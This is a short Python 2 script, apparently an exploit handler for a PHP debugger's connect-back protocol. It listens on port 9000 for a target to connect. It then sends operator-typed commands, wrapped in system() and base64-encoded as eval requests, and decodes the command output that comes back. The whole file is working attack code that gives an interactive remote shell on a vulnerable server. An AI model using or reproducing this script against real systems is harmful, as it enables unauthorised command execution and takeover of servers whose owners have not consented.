#!/usr/bin/python

# this will start listening on port 9000 and wait for the connect back
# upon connect back, it will run input as system command, and base64 decode the response

import socket,re

ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    result = re.search('<!\[CDATA\[(.*)\]\]>', client_data, re.IGNORECASE)

    if result:
    	output = result.group(1)
    	try:
    		output.decode('base64')
	    	print('result: %s' % output.decode('base64'))
    	except: 
	    	print('result: %s' % output)

    data = raw_input('>> ')
    data = 'system("%s")' % data
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))